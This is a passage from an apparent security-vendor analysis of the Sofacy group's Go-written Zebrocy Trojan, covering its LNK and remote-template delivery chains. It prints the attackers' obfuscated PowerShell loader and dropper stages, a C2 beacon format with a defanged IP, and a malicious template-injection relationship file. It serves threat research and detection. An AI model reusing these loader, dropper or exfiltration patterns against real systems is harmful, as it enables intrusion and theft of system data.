		<div id="crayon-5f69288f1816e001022052" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$p1,$p2=3659,6924764;$pathToLNK='C5 regional conference and training workshop on community policing(1).docx.lnk';if(-nOT(TeSt-pAtH $pathToLNK)){$DirD=GeT-CHILdITEM -pAth $env:temp -fiLTer $pathToLNK -rEcUrSE;[iO.diRectoRY]::sETCUrrentDIrEctoRY($DirD.dIreCTORYNAMe);}$FileStreama=nEw-objECT io.fILeSTreAm $pathToLNK,'OpeN','ReAd','reaDwRITE';$ArrayMas=NEw-objecT byTE[]($p2);$FileStreama.SEeK($p1,[io.SeEKoRiGin]::BEGin);$FileStreama.rEAD($ArrayMas,0,$p2);$ArrayMas=[ConverT]::FrOmbasE64CHarArRAy($ArrayMas,0,$ArrayMas.LeNGTh);$duacajuA=[texT.EnCOdInG]::Unicode.gETstRIng($ArrayMas);ieX $duacajuA;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69288f1816e001022052-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69288f1816e001022052-1"><span class="crayon-sy">$</span><span class="crayon-v">p1</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">p2</span><span class="crayon-o">=</span><span class="crayon-cn">3659</span><span class="crayon-sy">,</span><span class="crayon-cn">6924764</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">pathToLNK</span><span class="crayon-o">=</span><span class="crayon-s">'C5 regional conference and training workshop on community policing(1).docx.lnk'</span><span class="crayon-sy">;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">-</span><span class="crayon-st">nOT</span><span class="crayon-sy">(</span><span class="crayon-v">TeSt</span><span class="crayon-o">-</span><span class="crayon-i">pAtH</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">pathToLNK</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">DirD</span><span class="crayon-o">=</span><span class="crayon-v">GeT</span><span class="crayon-o">-</span><span class="crayon-v">CHILdITEM</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">pAth</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">env</span><span class="crayon-o">:</span><span class="crayon-v">temp</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">fiLTer</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">pathToLNK</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">rEcUrSE</span><span class="crayon-sy">;</span><span class="crayon-sy">[</span><span class="crayon-v">iO</span><span class="crayon-sy">.</span><span class="crayon-v">diRectoRY</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">sETCUrrentDIrEctoRY</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">DirD</span><span class="crayon-sy">.</span><span class="crayon-v">dIreCTORYNAMe</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span><span class="crayon-sy">$</span><span class="crayon-v">FileStreama</span><span class="crayon-o">=</span><span class="crayon-r">nEw</span><span class="crayon-o">-</span><span class="crayon-t">objECT</span><span class="crayon-h"> </span><span class="crayon-v">io</span><span class="crayon-sy">.</span><span class="crayon-i">fILeSTreAm</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">pathToLNK</span><span class="crayon-sy">,</span><span class="crayon-s">'OpeN'</span><span class="crayon-sy">,</span><span class="crayon-s">'ReAd'</span><span class="crayon-sy">,</span><span class="crayon-s">'reaDwRITE'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">ArrayMas</span><span class="crayon-o">=</span><span class="crayon-r">NEw</span><span class="crayon-o">-</span><span class="crayon-t">objecT</span><span class="crayon-h"> </span><span class="crayon-t">byTE</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">p2</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">FileStreama</span><span class="crayon-sy">.</span><span class="crayon-e">SEeK</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">p1</span><span class="crayon-sy">,</span><span class="crayon-sy">[</span><span class="crayon-v">io</span><span class="crayon-sy">.</span><span class="crayon-v">SeEKoRiGin</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">BEGin</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">FileStreama</span><span class="crayon-sy">.</span><span class="crayon-e">rEAD</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ArrayMas</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">p2</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">ArrayMas</span><span class="crayon-o">=</span><span class="crayon-sy">[</span><span class="crayon-v">ConverT</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">FrOmbasE64CHarArRAy</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ArrayMas</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">ArrayMas</span><span class="crayon-sy">.</span><span class="crayon-v">LeNGTh</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">duacajuA</span><span class="crayon-o">=</span><span class="crayon-sy">[</span><span class="crayon-v">texT</span><span class="crayon-sy">.</span><span class="crayon-v">EnCOdInG</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Unicode</span><span class="crayon-sy">.</span><span class="crayon-e">gETstRIng</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ArrayMas</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-i">ieX</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">duacajuA</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0011 seconds] -->
<p>&nbsp;</p>
<p>The PowerShell script above attempts to extract another PowerShell script directly from the LNK shortcut file, which it would then execute. For unknown reasons, the actor that created this LNK shortcut included the incorrect filename for the LNK file, specifically <span style="font-family: courier new, courier, monospace">C5 regional conference and training workshop on community policing(1).docx.lnk</span> instead of the delivery document <span style="font-family: courier new, courier, monospace">Противодействие Думы Санкциям США.doc.</span>  The LNK shortcut filename does not match the filename delivered in the email, so this attack would never be successful as the PowerShell script above would be unable to obtain the payload to install on the system. The <span style="font-family: courier new, courier, monospace">C5 regional conference and training workshop on community policing(1).docx.lnk</span> filename included in this LNK file may be an artifact from a previous attack using the same delivery LNK and payload.</p>
<p>Had the attackers included the correct filename to the LNK delivery in the script above, it would have located the PowerShell script in the LNK file by using a hardcoded offset of &#8220;3659&#8221;, which it would have used to seek 3659 bytes into the LNK file. The script would then read a hardcoded number of bytes, specifically 6,924,764 bytes from this offset and executes it. The resulting PowerShell script obtained from within the LNK file has the following contents, of which we have trimmed some of the encoded data and replaced it with &#8220;[..snip..]&#8221; for brevity:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69288f18173856275643" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$6vlJwyyB = @('C5 regional conference and training workshop on community policing(1).exe','C5 regional conference and training workshop on community policing(1).docx');$TcCd3Fej = "C5 regional conference and training workshop on community policing(1).exe";$Aq3NkyDG = @("TVqQAAMA[..snip..]","UEsDBBQABgAIAA[..snip..]");$ggdDQhlx = "C5 regional conference and training workshop on community policing(1).docx";FOR($I=0;$I -lt $6vLjwYYb.LengTH;$i++){[BYtE[]]$YGktk0Nk = [cOnveRt]::frOmBaSE64StriNg($aq3nkYDg[$I]);[syStEm.IO.fILE]::WrItEaLlbYtES($EnV:pUbLIc+"\"+$6VLJwYYB[$I],$YGktK0nk);}$qsVmUm76 = $Env:public+"\"+$tCcd3Fej;$GGdDQhLxPatH = $env:publIC+"\"+$gGddQHLX;staRT-pROCess -wINDowstylE HIDdeN -FIlepAth $qsVMuM76;StART-ProceSs -FilepaTh $GgDdQHlxpATH;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69288f18173856275643-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69288f18173856275643-1"><span class="crayon-sy">$</span><span class="crayon-cn">6vlJwyyB</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">(</span><span class="crayon-s">'C5 regional conference and training workshop on community policing(1).exe'</span><span class="crayon-sy">,</span><span class="crayon-s">'C5 regional conference and training workshop on community policing(1).docx'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">TcCd3Fej</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"C5 regional conference and training workshop on community policing(1).exe"</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">Aq3NkyDG</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">(</span><span class="crayon-s">"TVqQAAMA[..snip..]"</span><span class="crayon-sy">,</span><span class="crayon-s">"UEsDBBQABgAIAA[..snip..]"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">ggdDQhlx</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"C5 regional conference and training workshop on community policing(1).docx"</span><span class="crayon-sy">;</span><span class="crayon-st">FOR</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">I</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">I</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">lt</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-cn">6vLjwYYb.LengTH</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-o">++</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">[</span><span class="crayon-t">BYtE</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">$</span><span class="crayon-v">YGktk0Nk</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">cOnveRt</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">frOmBaSE64StriNg</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">aq3nkYDg</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">I</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">[</span><span class="crayon-v">syStEm</span><span class="crayon-sy">.</span><span class="crayon-v">IO</span><span class="crayon-sy">.</span><span class="crayon-v">fILE</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">WrItEaLlbYtES</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">EnV</span><span class="crayon-o">:</span><span class="crayon-m">pUbLIc</span><span class="crayon-o">+</span><span class="crayon-s">"\"+$6VLJwYYB[$I],$YGktK0nk);}$qsVmUm76 = $Env:public+"</span><span class="crayon-sy">\</span>"<span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">tCcd3Fej</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">GGdDQhLxPatH</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">env</span><span class="crayon-o">:</span><span class="crayon-m">publIC</span><span class="crayon-o">+</span>"<span class="crayon-sy">\</span>"<span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">gGddQHLX</span><span class="crayon-sy">;</span><span class="crayon-v">staRT</span><span class="crayon-o">-</span><span class="crayon-v">pROCess</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">wINDowstylE </span><span class="crayon-v">HIDdeN</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">FIlepAth</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">qsVMuM76</span><span class="crayon-sy">;</span><span class="crayon-v">StART</span><span class="crayon-o">-</span><span class="crayon-v">ProceSs</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">FilepaTh</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">GgDdQHlxpATH</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p>&nbsp;</p>
<p>This final PowerShell script is responsible for decoding an executable and Word document that it will write to the system in the %PUBLIC% folder with names <span style="font-family: courier new, courier, monospace">C5 regional conference and training workshop on community policing(1).exe</span> and <span style="font-family: courier new, courier, monospace">C5 regional conference and training workshop on community policing(1).docx,</span> respectively. The decoded content written to the Word document contains the decoy content seen in Figure 2 (<span style="font-family: courier new, courier, monospace">SHA256:b6b2f6aae80cba3fa142bd216decc1f6db024a5ab46d9c21cf6e4c1ab0bbe58b</span>), which in this specific case is an agenda for a conference that occurred between June 18 and 20, 2018 in Dushanbe, Tajikistan sponsored by <a href="https://www.saferworld.org.uk/">Saferworld</a> and the <a href="https://www.usip.org/">United States Institute of Peace</a>.</p>
<p>&nbsp;</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy2-300x232.png" rel="wpdevart_lightbox"><img class=" wp-image-95933 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy2-300x232.png" alt="" width="424" height="328" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy2-300x232.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy2-900x695.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy2-768x593.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy2-370x286.png 370w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy2.png 974w" sizes="(max-width: 424px) 100vw, 424px" /></a></p>
<p style="text-align: center"><em>Figure 2 Decoy document opened during installation of Go Zebrocy</em></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>The decoded executable is the payload (<span style="font-family: courier new, courier, monospace">SHA256: fcf03bf5ef4babce577dd13483391344e957fd2c855624c9f0573880b8cba62e</span>) whose developer wrote in the Go Language, which appears to be a variant of the Zebrocy Trojan that we have previously analyzed. The use of another language to develop a similar Trojan in functionality to Zebrocy is fitting for this threat group, as we have previously seen this group create variants of Zebrocy in AutoIt, Delphi and C++. The similarities between this payload and previous Zebrocy variants include general high-level capabilities as well as some more specific overlaps. Like other Zebrocy samples, this Zebrocy variant written in Go does initial collection on the compromised system (<a href="https://attack.mitre.org/techniques/T1119/">T1119</a>), exfiltrates this information to the C2 server and attempts to download, install and execute a payload from the C2. The Go variant also has some more specific overlaps in its functionality, including:</p>
<p>&nbsp;</p>
<ul>
<li>The use of ASCII hexadecimal obfuscation of strings</li>
<li>The use of the volume serial number without a hyphen obtained from the VOL command</li>
<li>The use of the output from &#8220;systeminfo&#8221; and &#8220;tasklist&#8221; in the outbound C2 beacon</li>
<li>The use of the string &#8220;PrgStart&#8221; within the C2 beacon</li>
</ul>
<p>&nbsp;</p>
<p>The most important overlap between the Go variant of Zebrocy and other variants is a shared C2 URL, specifically <span style="font-family: courier new, courier, monospace">hxxp://89.37.226[.]148/technet-support/library/online-service-description.php?id_name=</span> that was also used by Zebrocy samples <span style="font-family: courier new, courier, monospace">de31a8a9110b32a82843e9216a3378cc1c5ea972a6bb2261ec111efb82f31e71</span> and <span style="font-family: courier new, courier, monospace">daf990f0b6564c3ac87fa87e325e6ffc907ed43ae65a3f088a42b5b120612593</span>, which were both written in Delphi.</p>
<p>The Go variant of Zebrocy attempts to evade automated analysis by checking the executable filename of its process for the “)” character. If the filename does not contain a “)” character, the Trojan immediately exits without executing its functional code. The Trojan looks for this character specifically, because it expects to run as a file named <span style="font-family: courier new, courier, monospace">C5 regional conference and training workshop on community policing(1).exe.</span></p>
<p>This Zebrocy variant uses HTTP POST requests to interact with its C2 server (<a href="https://attack.mitre.org/techniques/T1071/">T1071</a>), which contains system specific information in the POST data section. The system specific information includes</p>
<ul>
<li>Running processes via “tasklist” command (<a href="https://attack.mitre.org/techniques/T1057/">T1057</a>).</li>
<li>System information via the ”systeminfo” command (<a href="https://attack.mitre.org/techniques/T1082/">T1082</a>).</li>
<li>Local disk information (<a href="https://attack.mitre.org/techniques/T1120/">T1120</a>) via WMI by running the command “wmic logicaldisk get caption,description,drivetype,providername,size” (<a href="https://attack.mitre.org/techniques/T1047/">T1047</a>).</li>
<li>A screenshot of the desktop (<a href="https://attack.mitre.org/techniques/T1113/">T1113</a>) that the GoZebrocy tool takes using an <a href="https://github.com/kbinani/screenshot">open source Go library</a>.</li>
</ul>
<p>The C2 communications between the Trojan and its C2 has the following structure:</p>
<p>&nbsp;</p>
<p><span style="font-family: courier new, courier, monospace">POST /technet-support/library/online-service-description.php?id_name=[serial number from VOL command with hyphen removed] HTTP/1.1</span></p>
<p><span style="font-family: courier new, courier, monospace">Host: 89.37.226[.]148</span></p>
<p><span style="font-family: courier new, courier, monospace">User-Agent: Go-http-client/1.1</span></p>
<p><span style="font-family: courier new, courier, monospace">Content-Length: 570690</span></p>
<p><span style="font-family: courier new, courier, monospace">Content-Type: application/x-www-form-urlencoded</span></p>
<p><span style="font-family: courier new, courier, monospace">Accept-Encoding: gzip</span></p>
<p>&nbsp;</p>
<p><span style="font-family: courier new, courier, monospace">attach=PrgStart%3A[path to running Trojan]%0D%0A%5B[current time]%5D%0D%0A%0D%0A[results from wmic logicaldisk get caption,description,drivetype,providername,size]%0D%0D%0A%0D%0D%0A%0D%0A%0D%0A[results systeminfo command]%0D%0A%0D%0A%0D%0A[results tasklist command]%0D%0A&amp;support=[screenshot of system represented as ascii hexadecimal bytes]</span></p>
<p>&nbsp;</p>
<p>The C2 server will respond to this HTTP POST request with ascii hexadecimal bytes that the payload will decode and save to the following file (<a href="https://attack.mitre.org/techniques/T1105/">T1105</a>):</p>
<p>&nbsp;</p>
<p><span style="font-family: courier new, courier, monospace">%APPDATA%\Identities\{83AF1378-986F-1673-091A-02681FA62C3B}\w32srv.exe</span></p>
<p>&nbsp;</p>
<p>The payload will then execute this newly created file using the Golang &#8220;os/exec&#8221; module, specifically using the &#8220;Command&#8221; and &#8220;Run&#8221; functions in the &#8220;os/exec&#8221; module to run the following command line:</p>
<p>&nbsp;</p>
<p><span style="font-family: courier new, courier, monospace">cmd /C %APPDATA%\Identities\{83AF1378-986F-1673-091A-02681FA62C3B}\w32srv.exe</span></p>
<p>&nbsp;</p>
<p><strong>Dear Joohn Related Delivery</strong></p>
<p>The second attack we observed delivering the Zebrocy variant written in the Go language is related to the <a href="https://unit42.paloaltonetworks.com/dear-joohn-sofacy-groups-global-campaign/">Dear Joohn attacks that we have previously published</a>. While the Dear Joohn campaign occurred in mid-October to mid-November 2018, the delivery document (<span style="font-family: courier new, courier, monospace">SHA256: 346e5dc097b8653842b5b4acfad21e223b7fca976fb82b8c10d9fa4f3747dfa0</span>) that ultimately installed the Go Zebrocy sample was created on December 3, 2018. This delivery document had an author name of Joohn, which is how we clustered the Dear Joohn delivery documents for that campaign.</p>
<p>Like the Dear Joohn attacks, the delivery document downloads a remote template (<span style="font-family: courier new, courier, monospace">SHA256: 07646dc0a8c8946bb78be9b96147d4327705c1a3c3bd3fbcedab32c43d914305</span>) via HTTP (<a href="https://attack.mitre.org/techniques/T1071/">T1071</a>) that has an author and last saved by xxx. Upon opening the delivery document, the lure image seen in Figure 3 attempts to trick the recipient into enabling content (<a href="https://attack.mitre.org/techniques/T1204/">T1204</a>) to run the macro within the downloaded remote template.</p>
<p>&nbsp;</p>
<p style="text-align: center"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy3-300x126.png" rel="wpdevart_lightbox"><img class="wp-image-95932 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy3-300x126.png" alt="" width="457" height="192" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy3-300x126.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy3-900x379.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy3-768x323.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy3-370x156.png 370w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy3.png 974w" sizes="(max-width: 457px) 100vw, 457px" /></a><em>Figure 3 Lure image attempting to trick user into clicking the Enabling Content button</em></p>
<p>&nbsp;</p>
<p>The delivery document is configured to obtain a remote template from <span style="font-family: courier new, courier, monospace">hxxps://bit[.]ly/2G8QrgL</span> (<a href="https://attack.mitre.org/techniques/T1102/">T1102</a>), as seen in the following from the document’s <span style="font-family: courier new, courier, monospace">word/_rels/settings.xml.rels</span> file:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69288f1817c463992055" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"&gt;&lt;Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="hxxps://bit[.]ly/2G8QrgL" TargetMode="External"/&gt;&lt;/Relationships&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69288f1817c463992055-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69288f1817c463992055-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69288f1817c463992055-1"><span class="crayon-ta">&lt;?</span><span class="crayon-e">xml </span><span class="crayon-i">version</span><span class="crayon-o">=</span><span class="crayon-s">"1.0"</span><span class="crayon-h"> </span><span class="crayon-i">encoding</span><span class="crayon-o">=</span><span class="crayon-s">"UTF-8"</span><span class="crayon-h"> </span><span class="crayon-i">standalone</span><span class="crayon-o">=</span><span class="crayon-s">"yes"</span><span class="crayon-ta">?&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69288f1817c463992055-2"><span class="crayon-o">&lt;</span><span class="crayon-e">Relationships </span><span class="crayon-v">xmlns</span><span class="crayon-o">=</span><span class="crayon-s">"http://schemas.openxmlformats.org/package/2006/relationships"</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-e">Relationship </span><span class="crayon-v">Id</span><span class="crayon-o">=</span><span class="crayon-s">"rId1"</span><span class="crayon-h"> </span><span class="crayon-v">Type</span><span class="crayon-o">=</span><span class="crayon-s">"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"</span><span class="crayon-h"> </span><span class="crayon-v">Target</span><span class="crayon-o">=</span><span class="crayon-s">"hxxps://bit[.]ly/2G8QrgL"</span><span class="crayon-h"> </span><span class="crayon-v">TargetMode</span><span class="crayon-o">=</span><span class="crayon-s">"External"</span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">Relationships</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0011 seconds] -->
<p>&nbsp;</p>
<p>The <span style="font-family: courier new, courier, monospace">hxxps://bit[.]ly/2G8QrgL</span> shortened link redirects to the remote template hosted at a URL of <span style="font-family: courier new, courier, monospace">hxxp://89.37.226[.]123/Templates/NormalOld.dotm</span>. Previous Dear Joohn delivery documents did not use a shortened link to obtain its remote template, which suggests a shift in techniques used in this campaign. Fortunately for us, the shortened link provides some statistics on how many visitors accessed the link and their country of origin. When accessed on December 5, 2018, Figure 4 shows the statistics for the shortened link, showing the link was created on December 3, 2018 at 12:56 PM, which was visited 75 times from mostly from Turkey.</p>
<p>&nbsp;</p>
